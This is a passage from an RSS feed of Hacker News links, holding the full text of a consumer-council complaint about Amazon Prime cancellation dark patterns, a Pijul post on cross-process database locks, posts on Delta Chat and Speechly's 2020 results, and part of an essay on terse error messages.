            <guid isPermaLink="false">hacker-news-small-sites-25790188</guid>
            <pubDate>Fri, 15 Jan 2021 12:34:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon manipulates customers to stay subscribed]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790161">thread link</a>) | @chillax
<br/>
January 15, 2021 | https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/ | <a href="https://web.archive.org/web/*/https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
				14. januar, 2021			</span>
		</p><article>
							<p>Amazon puts obstacles in the way of consumers who wish to unsubscribe from its Amazon Prime service. Today the Norwegian Consumer Council filed a legal complaint against the company for breaches of the Unfair Commercial Practices Directive.</p><p>In the process of unsubscribing from Amazon Prime, the company manipulates consumers to continue using the service in what seems like a deliberate attempt to confuse and frustrate customers.</p>
<p>The Norwegian Consumer Council`s <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/complaint-against-amazon-prime.pdf">legal complaint</a>&nbsp;to the Consumer Protection Authority highlights what we believe to be Amazon´s unfair commercial practices and breaches of marketing law.</p>
<p>– It should be as easy to end a subscription as it was to subscribe in the first place. Amazon should facilitate a good user experience instead of hindering customers and tricking them into continuing paid services they do not need or want, said Director of Digital Policy at the Norwegian Consumer Council, Finn Lützow-Holm Myrstad.</p>
<p>– In our view, this practice not only betrays the expectations and trust of consumers but breaches European law.</p>
<h2><strong>One out of four consumers struggle to unsubscribe </strong></h2>
<p>The Norwegian Consumer Council <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/population-survey-digital-content.pdf">surveyed 1,000 Norwegian consumers</a> and analysed their experience. One out of four Norwegian consumers reported difficulties unsubscribing from digital content services. Twenty-five percent of consumers surveyed reported that they pay for one or more subscriptions that they use with such infrequency that they might as well end the subscription.</p>
<p>– Most of us use digital content services to watch movies, listen to music or audiobooks, play video games, or read the news. At the same time, many consumers experience issues with subscriptions being very easy to sign up for, but difficult to get out of, said Finn Myrstad.</p>
<p>– Companies such as Amazon seem to speculate that they can discourage customers from cancelling their subscriptions either by heavily emphasizing the benefits that will be lost upon cancellation or by making the process so complicated that its users simply give up.</p>
<h2><strong>Amazon manipulates users into staying by using dark patterns</strong></h2>
<p><iframe src="https://www.youtube-nocookie.com/embed/GpEQ4OWNO4Y" width="650" height="433" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">The Norwegian Consumer Council’s study</a> analysed the cancellation process for Amazon Prime. The analysis shows that consumers who want to leave the service are faced with a large number of hurdles, including complicated navigation menus, skewed wording, confusing choices, and repeated nudging. Throughout the process, Amazon manipulates users through wording and graphic design, making the process needlessly difficult and frustrating to understand.</p>
<p>– Unfortunately, using <em>dark patterns</em>, or manipulative design, is a common practice online. Consumers are constantly bombarded by a variety of subtle and less subtle attempts to push us into making choices that favour the companies at the cost of our own time, attention, and money, said Myrstad.</p>
<h2><strong>A global problem requires global solutions</strong></h2>
<p>16 different consumer organizations in Europe and the United States are now taking action against Amazon based on the report by the Norwegian Consumer Council. They will each ask their respective consumer authorities to investigate the use of dark patterns in their countries.</p>
<p>This international campaign builds upon the Norwegian Consumer Council’s joint 2018 campaign with seven other European consumer organizations against Google’s use of dark patterns. The complaint, which the Irish Data Protection Commissioner’s office is still investigating, uncovered how Google manipulates users into turning on comprehensive location tracking.</p>
<p>– The Consumer Protection Authority can set an important precedent by issuing a decision against Amazon. A decision in favour of the complaint would mark that the use of dark patterns is not in accordance with European law and would elevate the rights of consumers.</p>
<span><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">Report: You can log out but you can never leave</a></span>
							</article><div>
			<div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg" alt="Bilde av ansatt: Finn Myrstad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg"></p><p>Finn Myrstad</p><p>Fagdirektør digitale tjenester</p><p>(+47) 479 66 900</p><p>finn.myrstad@forbrukerradet.no</p></div><div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg" alt="Bilde av ansatt: Øyvind Herseth Kaldestad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg"></p><p>Øyvind H. Kaldestad</p><p>Pressekontakt / Kommunikasjonsrådgiver</p><p>(+47) 480 82 619 </p><p>ohk@forbrukerradet.no</p></div>			<div><h3 id="tittel">About Amazon Prime and Dark Patterns</h3>
			<hr><p><strong>Amazon Prime</strong></p>
<p>A subscription to Amazon Prime provides discounts, shipping benefits, and access to other Amazon services. The Amazon Prime service has more than 150 million subscribers worldwide. Amazon’s European headquarters is in Luxembourg.</p>
<p><strong>Dark patterns</strong></p>
<p>Dark patterns, or manipulative design, are features of user interface design that nudge or push consumers into making choices that are in the best interest of the service provider, rather than in the interest of the consumer. This may include that certain options are easier to choose than others, that consumers are tricked into giving consent to sharing personal data, and many other practices.</p>
<p><a href="https://www.forbrukerradet.no/dark-patterns/">Se more about The Consumer Council’s work on dark patterns and cunning design.</a></p>
</div>						<p>
				<span>
					<a href="https://www.forbrukerradet.no/nyhetsvarsling">Subscribe to news in English</a>
				</span>
			</p>
		</div></div>]]>
            </description>
            <link>https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790161</guid>
            <pubDate>Fri, 15 Jan 2021 12:30:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing cross-process locks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790132">thread link</a>) | @gbrown_
<br/>
January 15, 2021 | https://pijul.org/posts/2021-01-15-sanakirja-locks/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2021-01-15-sanakirja-locks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Friday, January 15, 2021</p><p>I just finished implementing a non-trivial bit of Pijul: cross-process locks for Sanakirja databases.
In this post, I explain how it works.</p><h2 id="the-problem">The problem</h2><p>Sanakirja is essentially a <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> collection of <a href="https://en.wikipedia.org/wiki/B-tree">B trees</a> in a file. We can start <em>mutable</em> transactions, which allow us to change the database, and can be dropped (after which the database remains unmodified) or committed, and <em>immutable</em> transactions, which only allow us to read the database.</p><p>There are a few rules to prevent race conditions: there can only be one mutable transaction started at a time, and mutable transactions cannot start if an immutable transaction started before the last commit is still active.
In other words, the following scenarios are allowed: in these drawings, the green mutable transaction starts first, and the blue transaction starts after the commit of the green one. The pink immutable transaction starts before everything else. The pink transaction can continue even after the commit of the green transaction, and will read the database as it was before the green transaction started.</p><p>However, before starting the blue transaction, we must wait for the end of the pink one.</p><p><img src="https://pijul.org/img/concurrence0.svg"></p><p>As shown in the following drawing, it does not matter whether the pink transaction was started before or after the beginning of the green one:</p><p><img src="https://pijul.org/img/concurrence1.svg"></p><p>Another notable feature of this system is that another immutable transaction (drawn in orange in the below diagram) can even be started between the two mutable transactions, in parallel to the pink transaction. In that case, the orange and pink transactions will read <em>different versions</em> of the database.
This is allowed because the orange transaction starts <em>after</em> the commit of the green one.</p><p><img src="https://pijul.org/img/concurrence2.svg"></p><h2 id="implementation-of-the-trees">Implementation of the trees</h2><p>The size of nodes in the B tree is 4096 bytes, which is the size of memory pages on most platforms (<a href="https://www.oracle.com/technetwork/server-storage/sun-sparc-enterprise/documentation/sparc-arch-2007-2516668.pdf">UltraSPARC</a> being an exception, with 8192 bytes pages).</p><p><a href="https://pirl.nvsl.io/PIRL2019-content/PIRL-2019-Andy-Rudoff.pdf">Pages are often considered to synchronise to disk <em>atomically</em></a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, even though larger chunks might only be partially synchronised. This is why it is always safe to choose a smaller block size than the page size of the platform: the larger pages on UltraSPARC will be slower to synchronise, but that synchronisation will still happen atomically, thanks to disk caches.</p><p>In Sanakirja, the first page contains pointers to (1) the list of free pages and (2) a collections of at most 500 different pointers to B trees.</p><p>In a mutable transaction, existing pages are not modified: they are instead <em>copied</em> to a newly allocated page. This sounds horrible in terms of performance, but it is not that bad in practice, since we have to copy these pages to memory anyway before we can access them in the program, and write them back to disk after modifying them, and these synchronous input/output operations are much more expensive than copying page-size blocks, even on SSDs.</p><h2 id="cross-process-locks">Cross process locks</h2><p><a href="https://pijul.org/posts/2019-03-20-sanakirja-0.10/#the-concurrency-model">I wrote before about the lock model of Sanakirja</a>, but this was limited to the scope of a single process, and was relying on file locks to work, in the sense that any process using Sanakirja would first have to take an exclusive file lock, and then use the correct concurrency model between threads inside a process.</p><p>However, Pijul sometimes needs a bit more than this: for example, <a href="https://nest.pijul.com/cole-h">@cole-h</a> reported in issue <a href="https://nest.pijul.com/pijul/pijul/discussions/43">#43</a> that <code>pijul record</code> locked up other commands, which was inconvenient if you wanted to open a log while editing a change.</p><p>It is of course fundamental to prevent two records, or a record and a pull, to happen in parallel, but a full exclusive lock was clearly too much.</p><p>The system needs three atomic variables in order to work:</p><ul><li>A global clock, incremented at each commit.</li><li>A counter of active immutable transactions.</li><li>A counter of transactions active during the last commit. This is useful to make the difference between the pink and orange transactions in the drawings above.</li></ul><p>Each immutable transaction remembers the value of the clock at the time it starts, and increments the active transaction counter. When it stops, it decrements the counter of active immutable transactions, and if it started before the last commit, also decrements the counter of transactions active during the last commit.</p><p>I considered two different systems to implement this in a cross-process way:</p><ol><li><p>Reading and updating all these values at once to a file at each operation (maybe using shared memory), where the file would be protected by a lock (or a named mutex or semaphore). This sounds feasible in principle, but there is a catch: at the end of the last immutable transaction that was started before the last commit, we need a mechanism to signal to a potential mutable transaction that it can start. Between threads, this is achieved with condition variables. Between processes, this is more complicated: we could use Unix signals, but their handlers can interrupt any running function, which means that these handlers cannot take any mutex, and cannot talk to Tokio at all, which limits their usefulness.</p></li><li><p>The other option, which I ended up implementing, is to write a barebones implementation of the locking model in an external process, using Tokio tasks to model transactions, and communicate with that Tokio runtime with Unix Domain Sockets. Every time a transaction starts, it tries to connect to a Unix Domain Socket at a specified location. If that fails, a new process is forked, to run the <code>pijul lock</code> hidden command in the background (using <a href="https://doc.rust-lang.org/std/process/struct.Command.html#method.spawn">std::process::Command::spawn</a>), which opens a Unix Domain Socket and prints a new line to its standard output. The parent process waits for that newline, and then connects to the socket. The <code>pijul lock</code> command then works as follows:</p></li></ol><ul><li>The protocol implemented over the UDS has three commands (start an immutable transaction, start a mutable transaction, and commit), and two answers (called <code>ack</code> and <code>locked</code>). All these messages are encoded on one byte.</li><li>The caller use Tokio IO to wait for a response.</li><li>When the last client disconnects from the socket, <code>pijul lock</code> waits for one second, checks whether there are other clients, and then exits if there are none. This delay avoids starting instances of <code>pijul lock</code> over and over again when using pijul in a script.</li></ul><p>The source code for that new command can be seen <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.BQOAA">here on the Nest</a>, and the source code for the two kinds of transactions is available <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.UQDQA">here, also on the Nest</a>.</p><h2 id="conclusion">Conclusion</h2><p>First, this only works on Unix platforms at the moment, but it seems the equivalent of UDS on Windows <a href="https://github.com/tokio-rs/tokio/issues/2201">might be implemented soon in Tokio</a>. Pijul on Windows still relies on standard file locks.</p><p>Moreover, this is implemented in Pijul at the moment, not in Libpijul, because Libpijul is not meant to depend on Tokio in the long run (that dependency will be dropped before the beta of 1.0).</p><p>A finaly thing to note is that file locks are advisory, and so is this external process. This means that they are safe to use as long as all processes that write to the database are aware of them. However, as is the case for all files in a filesystem, a process that refuses to cooperate, and has write access to a file, will always be able to corrupt it.</p><h2 id="discussions">Discussions</h2><ul><li><a href="https://www.reddit.com/r/rust/comments/kxt19w/crossprocess_locks_between_transactions_in/">On Reddit</a></li><li><a href="https://pijul.zulipchat.com/">On Zulip</a></li></ul><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>Thanks to HackerNews user @vlowther for pointing out an oversimplification in an earlier version of this post. Sanakirja relies on the atomicity of $24 + 8r$ bytes, where $r$ is the number of “root” tables. In most cases, this is way less than 4Kb. When loads of tables are needed, Sanakirja can represent “tables of tables, indexed for example by an integer” (this has the Rust type <code>Db&lt;u64, Db&lt;K, V&gt;&gt;</code>), using a single root table, in which case the atomicity requirement falls down to 32 bytes. <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li></ol></section></div></div>]]>
            </description>
            <link>https://pijul.org/posts/2021-01-15-sanakirja-locks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790132</guid>
            <pubDate>Fri, 15 Jan 2021 12:27:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790087">thread link</a>) | @galfarragem
<br/>
January 15, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790087</guid>
            <pubDate>Fri, 15 Jan 2021 12:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a team of 13 can achieve in one year in speech recognition?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789991">thread link</a>) | @ottomatias
<br/>
January 15, 2021 | https://www.speechly.com/blog/speechly-in-2020/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/speechly-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Speechly has existed now for about for five years. We are a team of 13 experienced software developers and machine learning experts and for the most part of that five years, we’ve been operating in stealth mode, focusing on building our core technologies. Now it’s time to tell what we’ve achieved so far. We are building a <a href="https://www.speechly.com/develop/">developer tool</a> for improving touch screen user experience by voice functionalities. We don’t believe that smart speakers and voice assistants are the best use case for voice, but voice should be thought of as an add-on to current mobile applications’ and websites’ user interface. Voice is a modality, not a complete user interface.</p><p>Touch screen user interfaces definitely need improvements: while selecting from a few options is easy, selecting for example 30 items from an inventory of 20.000 is pretty cumbersome.</p><p>Typing is notoriously hard, too. Most humans speak about three times faster with less errors than they type. In short, voice is a great solution for information heavy tasks. While there are good solutions for speech recognition, there’s really no tools that would enable developers build the kind of user interfaces we’ve envisioned for voice.</p><p>2020 was our first year when we really published something out in the wild. We’ve built our technology for the past five years and now Speechly is finally in a stage that a developer can configure a model, integrate it to their application and build an awesome voice user interface. In this post, I’ll summarize our achievements.</p><h2>1 Spoken Language Understanding accuracy matching Google</h2><p>We run our own ASR and NLU technologies that provide both transcript and meaning (intents and entities) in real-time. During the 2020 we achieved significant increases in both ASR and NLU accuracy.</p><p>We evaluate the accuracy of our engine by transcribing the data we receive with both our own and with <a href="https://cloud.google.com/speech-to-text">Google Cloud Speech API</a>. Based on our results, our Spoken Language Understanding is in a typical voice user interface task <strong>15% more accurate</strong> than Google.</p><p>Because ASR is a hard task, this is not to claim that our technology is better than Google in all cases. It means that when building voice user interfaces, Speechly outperforms Google in most cases, even without training the model separately for a certain use case.</p><p>In a real case, Speechly can further be optimized by using the actual user data for retraining the model. This improves the accuracy typically by another 10-15%.</p><h2>2 Client libraries for most important web and mobile platforms</h2><p>During the 2020, we’ve published three client libraries that make integrating Speechly to an application simple and fast. Handling GRPC API, real-time audio streaming and of course parsing the results is a cumbersome task and the client libraries take most of the workload off our developers.</p><p>Our <a href="https://docs.speechly.com/client-libraries/web-client/">browser-client</a> can be used in all web applications in modern browsers and <a href="https://docs.speechly.com/client-libraries/react/">React client</a> makes development on React framework even easier.</p><p>For the iOS, we released the <a href="https://docs.speechly.com/client-libraries/ios/">iOS client</a> and our <a href="https://docs.speechly.com/client-libraries/android/">Android client</a> will be published very soon. After that, developers can easily build a unified voice user interface on all major platforms.</p><p>We have created a simple tutorial application for all of the client libraries for a gradual learning curve on all platforms.</p><h2>3 Demos showcasing our technology</h2><p>Speechly is a tool for building real-time voice functionalities that <a href="https://www.speechly.com/blog/voice-application-design-guide/">integrate seamlessly</a> to existing touch or web user interfaces.</p><p>We <a href="https://www.speechly.com/blog/real-time-voice-user-interfaces/">don’t think</a> smart speakers or "voice-only” solutions is the best way to use voice and rather advocate multimodality and real-time visual feedback.</p><p>Some of the demos we built in 2020 include a <a href="https://fashion.speechly.com/">fashion eCommerce voice search filtering</a> app and a classic <a href="https://home-automation-app-demo.herokuapp.com/">home automation</a> app. Try them out!</p><h2>4 Speechly Annotation Language features for configuring voice user interfaces</h2><p>Our Speechly Annotation Language (SAL) is a syntax we use to annotate example utterances that are used to train our models. In 2020 we added many new features to SAL:</p><ul><li>Alphanumeric sequences</li><li>Dates</li><li>Permutations</li><li>Multi-intent utterances</li><li>Variables</li><li>Canonical entities for easy handling of synonyms</li><li>Lookup tables for handling large inventories</li></ul><p>With these features, developers and designers can create complex voice user interfaces with a minimal amount of example utterances. Because the same model can be used on all platforms, the user experience is unified.</p><h2>5 Improved latency in our GRPC API</h2><p>When iPhone nailed the user experience with the touch screen, one of the key features was the very responsive user interface that reacted immediately to user input. This is a key issue also for voice user interfaces.</p><p>We’ve improved our latency in 2020 significantly and now we can proudly say that our API is real-time with tail latency of under 200 milliseconds.</p><p>Low latency is the key to intuitive user experience in two ways: first, it enables user to correct themselves naturally by using voice and second, it encourages the user to go on with the voice experience.</p><p>Compare this to the traditional smart speaker user experience that first starts by uttering a wake word that sometimes fails. Once the wake word is recognized and user starts speaking, they’ll know whether they were understood only after they have stopped speaking and the system has processed the input. If the answer is wrong, the user needs to start again from the beginning.</p><h2>6 Speechly Dashboard</h2><p>In March we published the first version of the Speechly Dashboard, a web application for building and configuring Spoken Language Understanding models with the Speechly Annotation Language.</p><p>The Dashboard supports nearly all Speechly features and it’s the fastest way for getting up to speed with our technology. Hundreds of developers have already created their models and tried them out in the Speechly Playground.</p><h2>7 Other achievements</h2><p>We’ve also published our <a href="https://docs.speechly.com/">developer documentation</a>, many <a href="https://www.youtube.com/channel/UCvEar86D8CnD3zDJSydOdbA">videos on using our technology</a> and <a href="https://www.speechly.com/blog/configure-voice-ui-command-line/">command line tools</a> for integrating Speechly to multi-user development workflows.</p><p>We renewed our website to better position our product and hired many new developers and machine learning experts. Our founders have been interviewed in many industry leading podcasts and we were nominated as one of the Europe’s Hottest Startups.</p><p>If you want to work with us and build awesome developer tools for next-generation voice user interfaces, please check our <a href="https://www.speechly.com/careers/">careers page</a>.</p><h2>What next?</h2><p>Overall, we are pretty happy with our 2020. We’ve now built a technology stack that enables efficient user interfaces that improve user experience significantly. In 2021 we focus on showing the world some cool examples of our technology.</p><p>If you are interested in staying in the loop, please subscribe to our newsletter below.</p></div></div>]]>
            </description>
            <link>https://www.speechly.com/blog/speechly-in-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789991</guid>
            <pubDate>Fri, 15 Jan 2021 12:13:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Program Eloquence Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789837">thread link</a>) | @j-james
<br/>
January 15, 2021 | https://tilde.team/~kiedtl/blog/chatterbox/ | <a href="https://web.archive.org/web/*/https://tilde.team/~kiedtl/blog/chatterbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<a id="homelink" href="https://tilde.team/~kiedtl/">⟵ Back</a><hr>


<p>Let's compare some error messages -- specifically, the ones that occur when
you try to execute a nonexistant command in Windows PowerShell and GNU
Bash.</p>
<p>PowerShell:</p>
<pre><code>PS C:\&gt; lorem --ipsum dolor -sit amet
lorem : The term 'lorem' is not recognized as the name of a cmdlet, function, script file, or operable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ lorem --ipsum dolor -sit amet
+ ~~~~~
+ CategoryInfo          : ObjectNotFound: (lorem:String) [], CommandNotFoundException
+ FullyQualifiedErrorId : CommandNotFoundException

PS C:\&gt; exit
</code></pre>
<p>and GNU Bash:</p>
<pre><code>$ lorem --ipsum dolor -sit amet
bash: lorem: command not found
$ 
</code></pre>
<p>The first thing you'll notice is that PowerShell's output is far, <em>far</em>
more verbose. You've got an error, a nice helpful message suggesting that
you "check the spelling of the name and try again", and a stack trace.
Meanwhile, <code>bash</code> just tells you <code>command not found</code>.</p>
<p>So: which error message is better?</p>
<p>Eric Raymond, in his excellent book <em>The Art of UNIX Programming</em>, explains
that a good UNIX program should output the least amount of stuff that it
can, a rule he calls the "Rule of Silence":</p>
<blockquote>
<p>One of Unix's oldest and most persistent design rules is that when a
program has nothing interesting or surprising to say, it should <em>shut
up</em>. Well-behaved Unix programs do their jobs unobtrusively, with a
minimum of fuss and bother. Silence is golden.</p>
<p>This "silence is golden" rule eveolved originally because Unix predates
video displays. On the slow printing terminals of 1969, each line of
unnecessary output was a serious drain on the user's time. That
constraint is gone, but excellent reasons for terseness remain. (Raymond,
43)</p>
</blockquote>
<p>He quotes Ken Arnold:</p>
<blockquote>
<p>...important information should not be mixed in with verbosity about
internal program behaviour. If all displayed information is important,
important information is easy to find.</p>
</blockquote>
<p>Raymond continues:</p>
<blockquote>
<p>Well designed programs treat the user's attention and concentration as a
previous and limited resource, only to be claimed when necessary.
(Raymond, 44)</p>
</blockquote>
<p>It is Arnold's quote that I'd like to expand on. Not only should you not
include unimportant information, but you should also output the important
stuff in the tersest possible form.</p>
<p>Why? Because <strong>users don't like reading.</strong></p>
<p>When a user is using a particular application, they are usually trying to
get something done. They may be trying to check their email, launch an IM
client, or start their browser. Reading stuff takes time, and thus slows
the user down. Because of this, users will do the minimal amount of reading
that they can.</p>
<p>Therefore, a terse error message is more likely to get properly read than a
verbose error.</p>
<p>"But wait! PowerShell's message is more user-friendly, because it reminds
the user to check their spelling!" Pffft. Anyone smart (for lack of a
better word!) enough to use PowerShell will know that they should
double-check their spelling without an error message telling them to do so.</p>
<p>And even in "normal" applications -- where the majority of users are not
knowledgable enough to know that their spelling could be to blame -- an
error message that's too verbose is <em>still</em> problematic, because many, if
not most, non-techy users won't bother reading it!</p>
<p>And if you <em>simply must include</em> a help/hint message -- do so in a way that
won't distract the user from the actual error.</p>
<p>For example, just look at the default Windows error message for an
incorrect password:</p>
<blockquote>
<p>You can't sign into your device right now. Go to account.live.com to fix
the problem, or try the last password you used on this device.</p>
</blockquote>
<p>Now, this could have just been written as</p>
<blockquote>
<p>Login incorrect</p>
</blockquote>
<p>which is the error message that's displayed on Linux when a user attempts
to login from a TTY.</p>
<p>However: a "Windows account" is actually a Microsoft account, and the
password is the same. Which means that if a user changes her Microsoft
account password on another device, and then tries to login on another
device that hasn't connected to the internet yet and received the new
password, she will have to use the last password she used on that
particular device.</p>
<p>Most users, however, probably won't realize this in such
a scenario, so it's OK to say that in the error message. The trick is to
include it in such a way so as to not make the error message seem too long:</p>
<blockquote>
<p><strong>Incorrect password</strong></p>
<hr>
<p><em>Note: try using the last password you used on this device.</em></p>
</blockquote>
<p>Notice how the main error ("Incorrect password") is in bold, and the hint,
two lines below, was in italics. I didn't put the hint in
<small>small</small> text, because that would give the impression to a
naive user that it was some kind of legal/technical message that she
doesn't have to pay attention to.</p>
<h2 id="anti-case-studies">(anti-)case studies</h2>
<h3 id="google">Google</h3>
<p>Take a look at the error message given when your Google search didn't turn
up anything:</p>
<blockquote>
<p>Your search -- <strong>asdf;asdf;asdf;asdf;asdf;asdf;as...</strong> did not match any
documents.</p>
<p>Suggestions:</p>
<ul>
<li>Make sure all words are spelled correctly.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>For one thing, repeating the entire search query in bold isn't necessary.
The user already knows what they searched for.</p>
<p>The suggestions, however,
are OK since they are visually separate from the error.</p>
<p>Fixed:</p>
<blockquote>
<p><strong>No results found.</strong></p>
<hr>
<p>Tips:</p>
<ul>
<li>Check your spelling.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>Notice how I condensed the main error message and the first suggestion,
and replaced <code>Suggestions:</code> with <code>Tips:</code>.</p>
<h3 id="ssh">SSH</h3>
<pre><code>$ ssh tilde.zone
The authenticity of host 'tilde.zone (51.79.32.49)' can't be established.
ECDSA key fingerprint is SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'tilde.zone,51.79.32.49' (ECDSA) to the list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, please try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>I see several things wrong:</p>
<ul>
<li>the first line (<code>The authenticity of host can't be established</code>) is too verbose.</li>
<li>the second line (<code>ECDSA key fingerprint is...</code>) is too verbose.</li>
<li>the prompt to continue to way too verbose.</li>
<li>the warning is too verbose.</li>
<li>the <code>permission denied</code> error is just a little bit too verbose.</li>
</ul>
<p>Fixed:</p>
<pre><code>$ ssh tilde.zone
Authenticity of 'tilde.zone (51.79.32.49)' unknown.
ECDSA key fingerprint: SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc
Continue? (yes/no) yes
Warning: added host to list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>As you can see, I've condensed the first line, continue prompt, and warning
quite a bit; I've also changed the second line to not be a sentence, thus
eliminating a whole two letter word ;)</p>
<p>The warning has been changed to not repeat the host and ip address, which
was already listed previously. The completely unnecessary <code>please</code>
has been removed from the password error.</p>
<h3 id="su"><code>su</code></h3>
<p>The example with the shortest name also has the shortest error message,
<code>su</code>:</p>
<pre><code>$ su
Password:
su: Authentication failure
</code></pre>
